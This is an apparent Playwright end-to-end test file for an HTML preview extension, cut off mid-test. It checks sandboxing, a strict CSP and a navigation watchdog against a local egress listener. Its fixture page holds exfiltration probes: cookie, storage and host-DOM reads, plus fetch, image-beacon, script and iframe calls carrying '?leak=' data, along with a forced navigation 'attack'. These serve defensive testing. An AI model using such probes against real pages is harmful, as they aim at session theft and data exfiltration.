import { test, expect, type Browser, type Page, type Frame } from '@playwright/test';
import { mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { createServer, type Server as HttpServer, type IncomingMessage, type ServerResponse } from 'node:http';
import { join } from 'path';
import { apiGetConfig, createTaskViaApi, csrfFetch, ensureTaskStarted, getTaskData, navigateToTask, storageStatePath } from './helpers';

// HTML preview extension — end-to-end. Installs the local extension via
// install-local, then verifies the Preview button (HTML-family only), the
// preview-as-code-view-mirror contract (unsaved edits + external on-disk
// changes refresh the preview live), and the security model against a local
// egress listener:
//  - DEFAULT (scripts off): bare sandbox — a static page renders like a
//    no-JS browser, no dynamic data leaves, and there is no self-navigation
//    at all (the sandbox refuses even <meta refresh>).
//  - SCRIPTS ON: strict zero-egress CSP, opaque-origin isolation; external
//    self-navigation is blocked in flight by the host's frame-src 'self',
//    same-origin navs OUT of the tree (incl. <meta refresh>) are contained
//    by the load-event watchdog (frame reset, token released, warned).
//  - IN-TREE NAVIGATION: the doc may navigate to any file in the project
//    tree (links, JS, <meta refresh>) — the watchdog asks the server's nav
//    record (GET /nav) and allows only fresh in-tree serves; navigated
//    sibling documents carry the same doc CSP as the root doc, and the live
//    refresh is paused while the preview is on another in-tree page.
// Fixtures live in a uniquely named /tmp/kanban-test-repo subdir (plus one
// root-level CSS file for the widened asset root), removed in afterAll.

const TEST_REPO = '/tmp/kanban-test-repo';
const TS = Date.now();
const FIXTURE_DIR = `${TEST_REPO}/html-preview-${TS}`;
const PAGE_FILE = 'index.html';
const PAGE2_FILE = 'page2.html';
const PAGE3_FILE = 'sub/page3.html';
const REFRESH_FILE = 'meta-refresh.html';
const REFRESH_IN_TREE_FILE = 'meta-refresh-2.html';
const ROOT_CSS_FILE = `preview-root-css-${TS}.css`;
const REL_CSS_FILE = 'rel.css';
const SVG_FILE = 'logo.svg';

// Egress listener: records every request a previewed page sends outside the
// preview origin. Only the scripts-off previews' AUTHOR-WRITTEN static refs
// (STATIC_REFS) may legitimately arrive; scripts-on previews (strict CSP) may
// send nothing — including the deliberate nav attack. Serves valid content per
// path so an opened channel actually loads (and is counted).
let egressServer: HttpServer;
let egressBase = '';
const egressRequests: string[] = [];
const STATIC_REFS = ['/style-static?ref=css', '/img-static?ref=img', '/frame-static?ref=frame'];

function handleEgress(req: IncomingMessage, res: ServerResponse) {
  egressRequests.push(`${req.method} ${req.url}`);
  const url = req.url || '';
  if (url.startsWith('/image') || url.startsWith('/img')) {
    // 1x1 GIF so an unblocked <img> beacon would fire onload.
    res.writeHead(200, { 'Content-Type': 'image/gif' });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
    return;
  }
  if (url.startsWith('/style')) { res.writeHead(200, { 'Content-Type': 'text/css' }); res.end('/* egress */'); return; }
  if (url.startsWith('/script')) { res.writeHead(200, { 'Content-Type': 'text/javascript' }); res.end('/* egress */'); return; }
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end('<html><body>egress</body></html>');
}

// Fixture page. The STATIC_REFS resources are author-written (safe: a
// scriptless page can only request what its author wrote). The <script> probes
// are INERT in scripts-off mode and run under the strict CSP in the scripts-on
// test (where every dynamic channel must be blocked). Built in beforeAll.
let HTML_FIXTURE = '';
function buildHtmlFixture(exfilBase: string): string {
  return `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <link rel="stylesheet" href="/${ROOT_CSS_FILE}">
  <link rel="stylesheet" href="${REL_CSS_FILE}">
  <link rel="stylesheet" href="${exfilBase}/style-static?ref=css">
</head>
<body>
  <h1 id="title">HTML Preview Fixture</h1>
  <a id="to-page2" href="${PAGE2_FILE}">page 2</a>
  <p id="js-target">before</p>
  <div id="styled">styled box</div>
  <div id="rel-box">relative box</div>
  <img id="data-img" alt="dot" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12'%3E%3Crect width='12' height='12' fill='limegreen'/%3E%3C/svg%3E">
  <img id="remote-img" alt="remote" width="1" height="1" src="${exfilBase}/img-static?ref=img">
  <iframe id="remote-frame" src="${exfilBase}/frame-static?ref=frame" style="width:0;height:0;border:0" title="remote"></iframe>
  <div id="probes"></div>
  <script>document.getElementById('js-target').textContent = 'JS-RAN-42';</script>
  <script>
    // Isolation + exfiltration probes (inert with scripts off); under
    // scripts-on + strict CSP, host access and every egress channel must be blocked.
    (function () {
      const EXFIL = '%%EXFIL_BASE%%';
      const r = {};
      const attempts = [];
      const track = (p) => attempts.push(Promise.resolve(p).catch(() => {}));
      try { void window.top.document.title; r.topDom = 'read'; }
      catch (e) { r.topDom = 'blocked'; }
      try { void window.localStorage; r.storage = 'available'; }
      catch (e) { r.storage = 'blocked'; }
      try { void document.cookie; r.cookie = 'readable'; }
      catch (e) { r.cookie = 'blocked'; }
      fetch('/api/projects').then(
        () => { r.api = 'readable'; },
        () => { r.api = 'rejected'; }
      );
      // fetch/XHR/WebSocket class -> connect-src 'none'
      track(fetch(EXFIL + '/fetch?leak=dynamic').then(
        () => { r.exfilFetch = 'sent'; },
        () => { r.exfilFetch = 'blocked'; }
      ));
      // Image beacon -> img-src 'self' data: blob:
      const img = new Image();
      track(new Promise((res) => {
        img.onload = () => { r.exfilImage = 'sent'; res(); };
        img.onerror = () => { r.exfilImage = 'blocked'; res(); };
        img.src = EXFIL + '/image?leak=dynamic';
      }));
      // Stylesheet/script load -> style-src / script-src (a wildcard there is a
      // live exfil channel — the load request itself carries the URL).
      const style = document.createElement('link');
      style.rel = 'stylesheet';
      style.href = EXFIL + '/style?leak=dynamic';
      document.head.appendChild(style);
      const script = document.createElement('script');
      script.src = EXFIL + '/script?leak=dynamic';
      document.head.appendChild(script);
      // External frame -> frame-src 'none'
      const frame = document.createElement('iframe');
      frame.src = EXFIL + '/frame?leak=dynamic';
      document.body.appendChild(frame);
      track(Promise.allSettled(attempts).then(() => {
        document.getElementById('probes').textContent = JSON.stringify(r);
      }));
    })();
  </script>
</body>
</html>`
    .replace(/%%EXFIL_BASE%%/g, () => exfilBase);
}

const CSS_FIXTURE = `#styled {
  color: rgb(255, 0, 85);
  background-color: rgb(10, 20, 30);
  padding: 4px;
}
`;

const REL_CSS_FIXTURE = `#rel-box {
  color: rgb(0, 170, 170);
}
`;

const SVG_FIXTURE = `<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect width="40" height="40" fill="teal"/></svg>`;

// Meta-refresh fixture: <meta refresh> is the only non-script self-navigation
// a page has; same-origin target (/api/health), allowed by the host's
// frame-src 'self'. Scripts OFF: the bare sandbox refuses the redirect (it
// requires the allow-scripts keyword) — the preview stays. Scripts ON: the
// nav happens and the watchdog contains it. 2s delay: observe the static
// render first.
const REFRESH_FIXTURE = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="refresh" content="2;url=/api/health">
</head>
<body>
  <h1 id="title">META-REFRESH</h1>
</body>
</html>`;

// In-tree <meta refresh> (scripts-on): the refresh targets a SIBLING in the
// tree — the watchdog must ACCEPT it (the /api/health refresh above stays
// the out-of-tree containment case).
const REFRESH_IN_TREE_FIXTURE = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="refresh" content="2;url=${PAGE2_FILE}">
</head>
<body>
  <h1 id="title">META-REFRESH-INTREE</h1>
</body>
</html>`;

// Multi-page in-tree fixtures: index → page2 → sub/page3, and page2 links
// back to index.html — the doc's SELF-REFERENCE, which serves the CURRENT
// stored content, not the on-disk file.
const PAGE2_FIXTURE = `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
  <h1 id="title">PAGE-2</h1>
  <a id="to-page3" href="${PAGE3_FILE}">page 3</a>
  <a id="to-index" href="${PAGE_FILE}">index</a>
</body>
</html>`;

const PAGE3_FIXTURE = `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
  <h1 id="title">PAGE-3</h1>
</body>
</html>`;

// Task-view fixture (lives in a task worktree): minimal page, one title.
const TASK_FIXTURE = (tag: string) =>
    `<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><h1 id="title">TASK-PREVIEW-${tag}</h1></body></html>`;

/** Worktree host path for a task: <workspace_dir>/<projectId>/<taskId> (authenticated in-page config read). */
async function getWorktreeDir(page: Page, projectId: string, taskId: string): Promise<string> {
    const config = await apiGetConfig(page);
    const workspaceDir = config?.workspace_dir || '';
    return join(workspaceDir, projectId, taskId);
}

/** Poll the previewed document's #title (the frame is replaced on every re-serve). */
async function previewTitle(page: Page): Promise<string | null> {
    const f = page.frames().find(fr => fr.url().includes('/api/preview/'));
    if (!f) return null;
    const el = f.locator('#title');
    return (await el.count()) > 0 ? el.textContent() : null;
}

// No page fixture in beforeAll/afterAll — dedicated logged-in context.
/** Set in beforeAll: the two lanes are different servers, so the session file is lane-specific. */
let storageState = '/tmp/kanban-test-storage-state.json';

async function setupPage(browser: Browser) {
  const context = await browser.newContext({ storageState });
  const page = await context.newPage();
  await page.goto('/');
  return { context, page };
}

async function installLocal(page: Page): Promise<void> {
  // Local author = on-disk namespace dir (slugified); resolve like the Settings UI.
  const res = await page.evaluate(async () => {
    const session = await (await fetch('/api/auth/session')).json();
    const csrf = session.csrf_token || '';
    const localRes = await fetch('/api/extensions/local');
    const local = await localRes.json();
    // A non-array here means the server could not scan its extensions directory at all
    // (500 "scan the extensions directory failed") — say so instead of dying in .find().
    if (!Array.isArray(local)) throw new Error(`/api/extensions/local -> ${localRes.status}: ${JSON.stringify(local).slice(0, 300)}`);
    const entry = local.find((e: any) => e.name === 'html-preview');
    if (!entry) return { status: 404, text: 'html-preview not in local extensions list' };
    const r = await fetch('/api/extensions/install-local', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
      credentials: 'include',
      body: JSON.stringify({ author: entry.author, name: entry.name }),
    });
    const text = await r.text(); // SSE stream; fetch resolves when install completes
    return { status: r.status, text };
  });
  // "already installed" means setup's goal is already met. Treating it as a failure would couple
  // the spec to residue from an earlier run.
  if (res.status === 409 && res.text.includes('already installed')) return;
  if (res.status !== 200 && res.status !== 201) {
    throw new Error(`install-local failed (${res.status}): ${res.text.slice(0, 300)}`);
  }
}

async function getHtmlPreviewExtId(page: Page): Promise<string> {
  return await page.evaluate(async () => {
    const res = await fetch('/api/extensions');
    const exts = await res.json();
    return exts.find((e: any) => e.name === 'html-preview')?.id || '';
  });
}

/**
 * The project global-setup creates for TEST_REPO, looked up by PATH — the path is
 * the stable identity (its display name is the generic `test-project`, and other
 * specs create same-named siblings).
 */
async function testRepoProject(page: Page): Promise<{ id: string; name: string }> {
  return await page.evaluate(async (path) => {
    const res = await fetch('/api/projects');
    const projects = await res.json();
    if (!Array.isArray(projects)) throw new Error(`/api/projects -> ${res.status}: ${JSON.stringify(projects).slice(0, 200)}`);
    const mine = (projects as any[]).find((p) => p.path === path);
    return mine ? { id: mine.id, name: mine.name } : { id: '', name: '' };
  }, TEST_REPO);
}

/** Open TEST_REPO's project by deep link.
 *
 * Not a sidebar click: another worker's project may be selected first, and the explorer would
 * list that path instead — a path the server refuses (400 "path outside allowed project
 * directory"), leaving the panel with no list at all. The deep link names the project. */
async function selectTestRepoProject(page: Page): Promise<void> {
  const { id, name } = await testRepoProject(page);
  expect(name, `a project exists for ${TEST_REPO}`).not.toBe('');
  // Click the row (this is what actually mounts the project's explorer state); the deep link
  // alone leaves the file explorer unmounted.
  await page.locator(`a.project-item[href$="project=${id}"]`).click();
  await expect(page.locator('.top-bar')).toBeVisible({ timeout: 20000 });
}

/** Open the project explorer and open `file` (relative to repo root, with subfolders). */
async function openFile(page: Page, parts: string[]): Promise<void> {
  await page.goto('/'); // so the project lookup below has a document to fetch from
  await selectTestRepoProject(page);
  await page.waitForSelector('.top-bar', { timeout: 10000 });
  // The listing is a live `git status` of the repo: the slowest request on the box during
  // a full-suite run. When it fails the explorer shows an error and does NOT retry, so
  // reopen it the way a user would rather than fail on a transient.
  // Keep the listing failures visible: the explorer does not retry after an error, so an
  // open-and-no-list run is otherwise indistinguishable from a slow run.
  const listingFailures: string[] = [];
  let lastPath = '(never read)';
  page.on('response', (res) => {
    const u = new URL(res.url());
    if (u.pathname !== '/api/fs') return;
    listingFailures.push(`${res.status()} ${u.searchParams.get('path')} ${res.status() >= 400 ? u.searchParams.get('project') : ''}`);
  });

  for (let attempt = 0; attempt < 3; attempt++) {
    await page.locator('.explorer-btn').click();
    await expect(page.locator('.explorer-view')).toBeVisible({ timeout: 20000 });
    // Listing AND directory: `.file-browser-list` alone would happily describe another
    // project's directory (the explorer takes its path from whatever the app has selected,
    // and `/api/fs` resolves the project from the PATH — a stale selection gets refused with
    // 400 "path outside allowed project directory" and no list at all).
    const [listed, shownPath] = await Promise.all([
      page.locator('.file-browser-list').waitFor({ timeout: 10000 }).then(() => true).catch(() => false),
      page.locator('.file-browser-path-input').waitFor({ timeout: 10000 })
        .then(() => page.locator('.file-browser-path-input').inputValue())
        .catch(() => ''),
    ]);
    lastPath = shownPath;
    if (listed && shownPath === TEST_REPO) {
      await openParts(page, parts);
      return;
    }
    await page.locator('.close-btn, [aria-label="Close explorer"]').first().click().catch(() => {});
    await page.waitForTimeout(500);
  }
  throw new Error(
    `explorer never listed ${TEST_REPO} (last path shown: ${lastPath}); ` +
    `/api/fs failures: ${listingFailures.join(' | ') || 'none reported'}`,
  );
}

async function openParts(page: Page, parts: string[]): Promise<void> {
  for (const part of parts) {
    await page.locator('.file-browser-item', { hasText: part }).first().click();
    await page.waitForTimeout(150); // tree expands / editor loads
  }
  await expect(page.locator('.file-editor.active .cm-editor')).toBeVisible({ timeout: 10000 });
}

function previewButton(page: Page) {
  return page.locator('.file-editor.active .ext-footer-btn', { hasText: 'Preview' });
}

/** The nested preview frame (loaded from /api/preview/<token>/). */
async function previewFrameOf(page: Page): Promise<Frame> {
  for (let i = 0; i < 50; i++) {
    const f = page.frames().find(fr => fr.url().includes('/api/preview/'));
    if (f) return f;
    await page.waitForTimeout(200);
  }
  throw new Error('preview frame did not appear');
}

test.describe.serial('HTML Preview extension', () => {
  let extId = '';

  test.beforeAll(async ({ browser }, testInfo) => {
    storageState = storageStatePath(testInfo.project.name);
    // Egress listener first — the fixture's exfil probes need its URL.
    egressServer = createServer(handleEgress);
    await new Promise<void>((resolve) => egressServer.listen(0, '127.0.0.1', resolve));
    egressBase = `http://127.0.0.1:${(egressServer.address() as { port: number }).port}`;
    HTML_FIXTURE = buildHtmlFixture(egressBase);

    mkdirSync(FIXTURE_DIR, { recursive: true });
    writeFileSync(join(FIXTURE_DIR, PAGE_FILE), HTML_FIXTURE);
    writeFileSync(join(FIXTURE_DIR, REFRESH_FILE), REFRESH_FIXTURE);
    // Root-relative /<ROOT_CSS_FILE> now means the WORKTREE ROOT (widened
    // asset root) — the file lives at the repo root, uniquely named.
    writeFileSync(join(TEST_REPO, ROOT_CSS_FILE), CSS_FIXTURE);
    writeFileSync(join(FIXTURE_DIR, REL_CSS_FILE), REL_CSS_FIXTURE);
    writeFileSync(join(FIXTURE_DIR, SVG_FILE), SVG_FIXTURE);
    mkdirSync(join(FIXTURE_DIR, 'sub'), { recursive: true });
    writeFileSync(join(FIXTURE_DIR, PAGE2_FILE), PAGE2_FIXTURE);
    writeFileSync(join(FIXTURE_DIR, PAGE3_FILE), PAGE3_FIXTURE);
    writeFileSync(join(FIXTURE_DIR, REFRESH_IN_TREE_FILE), REFRESH_IN_TREE_FIXTURE);

    const { context, page } = await setupPage(browser);
    try {
      await installLocal(page);
      await expect.poll(() => getHtmlPreviewExtId(page), { timeout: 15000 }).not.toBe('');
      extId = await getHtmlPreviewExtId(page);
    } finally {
      await context.close();
    }
  });

  test.afterAll(async ({ browser }) => {
    // Final egress audit: only the scripts-off author-written static refs may have arrived.
    const unexpectedEgress = egressRequests.filter(
        r => !STATIC_REFS.some(ref => r.includes(ref)),
    );
    if (unexpectedEgress.length > 0) {
      throw new Error(`unexpected egress requests — exfiltration possible: ${unexpectedEgress.join(', ')}`);
    }
    if (egressServer) await new Promise<void>((resolve) => egressServer.close(() => resolve()));
    try {
      if (extId) {
        const { context, page } = await setupPage(browser);
        try {
          await page.evaluate(async (id) => {
            const session = await (await fetch('/api/auth/session')).json();
            await fetch(`/api/extensions/${id}`, {
              method: 'DELETE',
              headers: { 'X-CSRF-Token': session.csrf_token || '' },
              credentials: 'include',
            });
          }, extId);
        } finally {
          await context.close();
        }
      }
    } catch { /* best-effort cleanup */ }
    try { rmSync(FIXTURE_DIR, { recursive: true, force: true }); } catch { /* ignore */ }
    try { rmSync(join(TEST_REPO, ROOT_CSS_FILE), { force: true }); } catch { /* ignore */ }
  });

  test('Preview button appears for HTML/SVG files but not Markdown', async ({ page }) => {
    // Three openFile() calls = three app boots, three explorer listings and three
    // CodeMirror mounts. The default 45s was hit under full-suite load with nothing
    // actually wrong, so this one gets a bigger budget rather than fewer assertions.
    test.setTimeout(120000);
    // .html → button present
    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    await expect(previewButton(page)).toBeVisible({ timeout: 10000 });

    // .md → no button
    await openFile(page, ['README.md']);
    await expect(previewButton(page)).toHaveCount(0);

    // .svg → button present
    await openFile(page, [`html-preview-${TS}`, SVG_FILE]);
    await expect(previewButton(page)).toBeVisible({ timeout: 10000 });
  });

  test('default preview: scripts off, static page renders, remote resources load, nothing dynamic leaves', async ({ page }) => {
    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });

    // Capture the doc's server-set CSP header (inline meta tags can only tighten it).
    const docResponse = page.waitForResponse(
        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
    );
    await btn.click();
    const csp = (await docResponse).headers()['content-security-policy'] || '';
    // Scripts off → permissive CSP is safe (a scriptless page is fully static).
    expect(csp, 'scripts-off preview served with the permissive CSP').toContain('connect-src *');

    // Code view hidden, overlay shown.
    await expect(page.locator('.file-editor.active .editor-wrapper')).toHaveCSS('display', 'none', { timeout: 10000 });
    await expect(btn).toHaveClass(/active/);

    // Bare sandbox attribute (no tokens → no scripts, inherited by embedded iframes).
    const extFrame = page.frames().find(fr => fr.url().includes('/extensions/') && fr.url().includes('html-preview'));
    expect(extFrame, 'extension frame present').toBeTruthy();
    const sandbox = await extFrame!.locator('#preview-frame').getAttribute('sandbox');
    expect(sandbox, 'nested frame sandbox attribute (scripts off)').toBe('');

    const frame = await previewFrameOf(page);

    // Static content + local sibling assets render.
    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });
    // Root-relative /<ROOT_CSS_FILE> — rewritten SERVER-side to the token's
    // root (the worktree root): the file lives at the repo root, one level
    // ABOVE the doc's directory (widened asset root).
    await expect(frame.locator('#styled')).toHaveCSS('color', 'rgb(255, 0, 85)', { timeout: 15000 });
    await expect(frame.locator('#styled')).toHaveCSS('background-color', 'rgb(10, 20, 30)');
    // Relative rel.css also loads.
    await expect(frame.locator('#rel-box')).toHaveCSS('color', 'rgb(0, 170, 170)');
    // data: image renders.
    await expect(frame.locator('#data-img')).toBeVisible();

    // Scripts are OFF: the fixture's inline script never ran.
    await expect(frame.locator('#js-target')).toHaveText('before');

    // Remote static (author-written) resources DID load — no-JS-browser rendering.
    const baseline = 0; // first preview open of the run
    await expect.poll(
        () => egressRequests.filter(req => STATIC_REFS.some(ref => req.includes(ref))).length,
        { timeout: 15000 },
    ).toBe(baseline + STATIC_REFS.length);
    expect(egressRequests, 'no request may carry dynamic data').not.toContainEqual(expect.stringContaining('leak='));

    // Toggle off → code view restored.
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
    await expect(btn).not.toHaveClass(/active/);
  });

  test('scripts-off meta-refresh: the bare sandbox refuses the redirect, preview stays', async ({ page }) => {
    // Both toggles explicitly off (the default; makes the test order-independent).
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: false, allow_network: false } } });

    await openFile(page, [`html-preview-${TS}`, REFRESH_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });

    const docResponse = page.waitForResponse(
        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
    );
    await btn.click();
    const docUrl = (await docResponse).url();

    // The static page renders (the refresh fires after 2s).
    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('META-REFRESH', { timeout: 10000 });

    // Well past the 2s refresh window: the bare sandbox refused the redirect
    // (it requires the allow-scripts keyword) — nothing navigated, the token
    // is still live, no warning. The scripts-off guarantee: zero
    // self-navigation, including <meta refresh>.
    await page.waitForTimeout(4000);
    await expect(frame.locator('#title')).toHaveText('META-REFRESH');
    await expect.poll(
        async () => (await page.request.get(docUrl)).status(),
        { timeout: 5000 },
    ).toBe(200);
    await expect(page.locator('[data-ext-modal]', { hasText: 'navigate away' })).toHaveCount(0);

    // Toggle off → code view restored.
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
    await expect(btn).not.toHaveClass(/active/);
  });

  test('code-view edits (even unsaved) refresh the preview live', async ({ page }) => {
    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toHaveCSS('display', 'none', { timeout: 10000 });
    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });

    // Edit the code view only (disk untouched) — the preview must follow the unsaved buffer.
    const bufferOnly = `LIVE-BUFFER-${TS}`;
    const newContent = HTML_FIXTURE.replace('HTML Preview Fixture', bufferOnly);
    await page.evaluate((content) => {
      const cm = document.querySelector('.file-editor.active .cm-editor') as any;
      cm.__view.dispatch({
        changes: { from: 0, to: cm.__view.state.doc.length, insert: content },
      });
    }, newContent);

    // After the extension's 300ms debounce + re-serve, the buffer content is live (no save, no disk write).
    await expect.poll(() => previewTitle(page), { timeout: 15000 }).toContain(bufferOnly);

    // Toggle off and drop the persisted editor draft so later tests open clean.
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
    const filePath = join(FIXTURE_DIR, PAGE_FILE);
    await page.evaluate(async (path) => {
      return new Promise<void>((resolve) => {
        const req = indexedDB.open('kanban-storage', 3);
        req.onsuccess = () => {
          const tx = req.result.transaction('editor-drafts', 'readwrite');
          tx.objectStore('editor-drafts').delete(path);
          tx.oncomplete = () => resolve();
          tx.onerror = () => resolve();
        };
        req.onerror = () => resolve();
      });
    }, filePath);
  });

  test('external on-disk changes refresh the code view and the preview live', async ({ page }) => {
    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });
    await btn.click();
    await expect(page.locator('.file-editor.active .editor-wrapper')).toHaveCSS('display', 'none', { timeout: 10000 });
    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });

    // Change the file on disk (terminal/agent equivalent); the fs watcher (500ms)
    // reconciles the code view, and the preview must mirror it.
    const updated = `LIVE-DISK-${TS}`;
    const newContent = HTML_FIXTURE.replace('HTML Preview Fixture', updated);
    const filePath = join(FIXTURE_DIR, PAGE_FILE);
    writeFileSync(filePath, newContent);
    try {
      // (a) The code view reconciles the on-disk content into the buffer.
      await expect.poll(() => page.evaluate(() => {
        const cm = document.querySelector('.file-editor.active .cm-editor') as any;
        return cm ? cm.__view.state.doc.toString() : '';
      }), { timeout: 20000 }).toContain(updated);
      // (b) The preview mirrors the code view.
      await expect.poll(() => previewTitle(page), { timeout: 20000 }).toContain(updated);
    } finally {
      // Restore the original fixture (cleanup for other tests), then toggle off.
      writeFileSync(filePath, HTML_FIXTURE);
      await btn.click();
      await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
    }
  });

  test('scripts-on preview: strict zero-egress CSP + navigation watchdog', async ({ page }) => {
    // Opt into scripts (extension setting; read at extension init → reopen).
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: true } } });

    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });

    const docResponse = page.waitForResponse(
        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
    );
    await btn.click();
    const docUrl = (await docResponse).url();
    const csp = (await docResponse).headers()['content-security-policy'] || '';

    // Strict policy: no '*' in any load-type directive (a wildcard there is a live exfil channel).
    expect(csp, 'strict CSP on the preview doc').toContain("connect-src 'none'");
    expect(csp, 'no wildcard in any load-type directive').not.toMatch(
        /(script|style|img|font|media|frame|worker|object)-src[^;]*\*/);

    // allow-scripts token set (still no allow-same-origin → opaque origin).
    const extFrame = page.frames().find(fr => fr.url().includes('/extensions/') && fr.url().includes('html-preview'));
    expect(extFrame, 'extension frame present').toBeTruthy();
    const sandbox = await extFrame!.locator('#preview-frame').getAttribute('sandbox');
    expect(sandbox, 'nested frame sandbox attribute (scripts on)').toBe('allow-scripts');

    const frame = await previewFrameOf(page);
    await expect(frame.locator('#probes')).not.toHaveText('', { timeout: 15000 });
    const probes = JSON.parse((await frame.locator('#probes').textContent())!);

    // Opaque-origin host isolation.
    expect(probes.topDom, 'host DOM unreadable').toBe('blocked');
    expect(probes.storage, 'Web Storage unavailable').toBe('blocked');
    expect(probes.cookie, 'host cookies (session/CSRF) unreadable').toBe('blocked');
    expect(probes.api, 'host API responses unreadable (CORS)').toBe('rejected');
    // Every script-driven egress channel closed by the strict CSP.
    expect(probes.exfilFetch, 'fetch/XHR beacon blocked (connect-src none)').toBe('blocked');
    expect(probes.exfilImage, 'image beacon blocked (img-src restricted)').toBe('blocked');

    // With scripts on, even the static refs must be blocked — no new egress beyond
    // the scripts-off ones from earlier tests.
    const expectedStaticCount = egressRequests.filter(req => STATIC_REFS.some(ref => req.includes(ref))).length;
    await expect.poll(
        () => egressRequests.filter(req => STATIC_REFS.some(ref => req.includes(ref))).length,
        { timeout: 10000 },
    ).toBe(expectedStaticCount);
    expect(egressRequests, 'no dynamic egress with scripts on').not.toContainEqual(expect.stringContaining('leak='));

    // window.location self-navigation: a child frame's navigation is governed by
    // the embedding document's frame-src (host CSP: 'self'), so the attempt never
    // reaches the listener; the blocked nav's error load fires the watchdog
    // (frame reset, token killed, user warned, editor restored).
    const egressBeforeNav = egressRequests.length;
    await frame.evaluate((nav) => { window.location = nav; }, `${egressBase}/nav?leak=nav-attack`);

    // The watchdog reset the frame: no /api/preview frame left.
    await expect.poll(
        () => page.frames().some(fr => fr.url().includes('/api/preview/')),
        { timeout: 10000 },
    ).toBe(false);
    // Nothing reached the listener — the navigation was blocked in flight.
    expect(egressRequests, 'blocked navigation must not reach the egress listener').toHaveLength(egressBeforeNav);
    // The served doc's token is dead (release is async: postMessage → DELETE).
    await expect.poll(
        async () => (await page.request.get(docUrl)).status(),
        { timeout: 10000 },
    ).toBe(404);
    // The user is told what happened — as an app-level modal.
    const modal = page.locator('[data-ext-modal]', { hasText: 'navigate away' });
    await expect(modal).toBeVisible({ timeout: 10000 });
    // Dismiss it.
    await modal.locator('button').click();
    await expect(modal).toHaveCount(0);
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
  });

  test('scripts-on meta-refresh: same-origin navigation is allowed, the watchdog contains it', async ({ page }) => {
    // Scripts on (the setting is read at extension init — reopen the file).
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: true, allow_network: false } } });

    await openFile(page, [`html-preview-${TS}`, REFRESH_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });

    const docResponse = page.waitForResponse(
        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
    );
    await btn.click();
    const docUrl = (await docResponse).url();

    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('META-REFRESH', { timeout: 10000 });

    // With scripts on the redirect runs, and the same-origin target is
    // allowed by the host's frame-src 'self' (the doc's CSP does not govern
    // its own navigation) — so the frame really navigates; the WATCHDOG
    // (not CSP) contains it.
    await expect.poll(
        () => page.frames().some(fr => fr.url().includes('/api/preview/')),
        { timeout: 15000 },
    ).toBe(false);
    await expect.poll(
        async () => (await page.request.get(docUrl)).status(),
        { timeout: 10000 },
    ).toBe(404);
    // The user is told what happened — as an app-level modal.
    const modal = page.locator('[data-ext-modal]', { hasText: 'navigate away' });
    await expect(modal).toBeVisible({ timeout: 10000 });
    // Dismiss it.
    await modal.locator('button').click();
    await expect(modal).toHaveCount(0);
    await expect(page.locator('.file-editor.active .editor-wrapper')).toBeVisible({ timeout: 10000 });
  });

  test('in-tree navigation: links within the project tree are allowed (scripts off)', async ({ page }) => {
    await csrfFetch(page, `/api/extensions/${extId}`, { method: 'PUT', body: { config: { allow_scripts: false, allow_network: false } } });

    await openFile(page, [`html-preview-${TS}`, PAGE_FILE]);
    const btn = previewButton(page);
    await expect(btn).toBeVisible({ timeout: 10000 });

    const docResponse = page.waitForResponse(
        (resp) => resp.url().includes('/api/preview/') && resp.request().resourceType() === 'document',
    );
    await btn.click();
    const docUrl = (await docResponse).url(); // .../<token>/<fixture-dir>/ (the doc's own dir)
    const frame = await previewFrameOf(page);
    await expect(frame.locator('#title')).toHaveText('HTML Preview Fixture', { timeout: 15000 });

    // First hop: a sibling page (relative link, same token).
    await frame.locator('#to-page2').click();
